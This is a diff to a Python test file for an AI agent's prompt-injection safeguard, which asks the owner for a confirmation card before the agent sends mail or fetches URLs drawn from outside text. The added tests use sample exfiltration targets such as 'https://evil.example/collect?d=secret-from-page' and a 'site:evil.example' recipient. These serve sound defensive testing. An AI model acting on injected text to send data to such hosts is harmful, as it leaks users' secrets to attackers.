@@ -11,7 +11,7 @@ from assistant.agent import Tool, ToolResult, run_agent
 from assistant.effects import Effect
 from assistant.injection_watch import MODEL_NOTE, InjectionDetector, InjectionJudge, InjectionLog, InjectionWatch
 from assistant.injection_watch import current as watch_var
-from assistant.outside_rule import OutsideReview, OutsideTextRule, OwnerWords, PeopleBook, Person, named_targets
+from assistant.outside_rule import Derived, OutsideReview, OutsideTextRule, OwnerWords, PeopleBook, Person, named_targets
 from assistant.permissions import Gate, Info, Permissions
 from assistant.privacy_guard import PrivacyGuard
 from assistant.providers import Done, TextDelta, ToolCall
@@ -73,7 +73,7 @@ MAIL = Effect("send", "gmail", ["lee@x.org"], "hi", "email_send")
 
 def test_the_rule_asks_for_an_unnamed_target_after_outside_text_and_names_it_on_the_card():
     line = RULE.needs_card(MAIL, True, set(), "write to Lee")
-    assert line == "Kelo read outside text (a page, mail or message) before this step, and you did not name lee@x.org."
+    assert line == "Kelo read something in a page, mail or message before this step, and you did not name lee@x.org."
     two = RULE.needs_card(Effect("send", "gmail", ["a@x.org", "site:evil.example", "b@x.org", "c@x.org", "d@x.org"], "", "email_send"),
                           True, {"a@x.org"}, "")
     assert "site:" not in two and "evil.example" in two and "+1" in two
@@ -365,3 +365,44 @@ def test_the_owners_earlier_message_names_the_target_for_a_short_answer():
     assert "site:threads.com" in named
     assert "threads.com" in words.text({"source": "chat", "request": "너가"})
     assert OwnerWords(recent=lambda: ["threads.com 에 올려"]).named({"source": "schedule:3", "unattended": True, "request": ""}) == set()
+
+
+# ---------------------------------------------------------------------------------------- a recheck run reads pages found by search
+def fetch_review(turn, *, content=False):
+    """An OutsideReview whose derive says every target comes from outside text; `content`: the URL itself carries outside text."""
+    owner = OwnerWords(None)
+    return OutsideReview(RULE, owner, seen=lambda: True, turn=lambda: turn, derive=lambda targets, text: Derived(frozenset(targets), content))
+
+
+def test_a_recheck_run_fetching_a_page_found_by_search_asks_no_card():
+    rev = fetch_review({"source": "recheck", "unattended": True, "request": ""})
+    assert rev.line(None, "web_fetch", {"url": "https://apps.apple.com/kr/app/kakao-talk/id362057947"}) is None
+    assert rev.line(None, "web_fetch", {"url": "https://m.tworld.co.kr/main"}) is None
+
+
+def test_a_chat_turn_fetching_the_same_page_still_asks_a_card():
+    rev = fetch_review({"source": "chat", "unattended": False, "request": "이 페이지 봐줘"})
+    assert rev.line(None, "web_fetch", {"url": "https://apps.apple.com/kr/app/kakao-talk/id362057947"}) is not None
+
+
+def test_a_recheck_fetch_whose_url_carries_outside_text_still_asks_a_card():
+    rev = fetch_review({"source": "recheck", "unattended": True, "request": ""}, content=True)
+    assert rev.line(None, "web_fetch", {"url": "https://evil.example/collect?d=secret-from-page"}) is not None
+
+
+# ------------------------------------------------------------------------ a run nobody can answer reads a link its outside text gave
+GIVEN = "https://shop.example/product/?pid=8405532858-91316217716"
+
+
+def given_review(turn, given):
+    return OutsideReview(RULE, OwnerWords(None), seen=lambda: True, turn=lambda: turn, given=given,
+                         derive=lambda targets, text: Derived(frozenset(targets), True))
+
+
+def test_a_self_started_run_reads_a_link_its_outside_text_gave_as_written():
+    turn = {"source": "recheck", "unattended": True, "self_started": True, "request": ""}
+    assert given_review(turn, lambda u: u == GIVEN).line(None, "web_fetch", {"url": GIVEN}) is None
+    assert given_review(turn, lambda u: False).line(None, "web_fetch", {"url": GIVEN}) is not None
+    owner_run = {"source": "background", "unattended": True, "request": ""}
+    assert given_review(owner_run, lambda u: u == GIVEN).line(None, "web_fetch", {"url": GIVEN}) is not None   # an owner's run is unchanged
+
